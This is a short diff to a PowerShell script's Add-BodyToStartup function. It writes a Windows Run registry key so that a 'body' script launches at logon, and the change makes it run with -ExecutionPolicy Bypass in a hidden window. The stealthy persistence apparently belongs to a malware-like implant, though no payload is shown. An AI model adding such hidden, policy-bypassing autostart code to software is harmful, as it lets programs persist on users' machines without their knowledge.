@@ -6,7 +6,9 @@ function Add-BodyToStartup {
     $registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
     $keyName = Get-MachineCode
     $bodyPath = Get-BodyPath
-    $value = "powershell.exe -ExecutionPolicy Bypass -File `"$bodyPath`" -ArgumentList '-autostart true'"
+    # powershell.exe has no -ArgumentList; script args belong after -File (see Test-Autostart / $args).
+    $value = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$bodyPath`" -autostart true"
+    writedbg "Add-BodyToStartup: Run key name=$keyName path=$bodyPath"
 
     RegWrite -registryPath $registryPath -keyName $keyName -value $value
 }
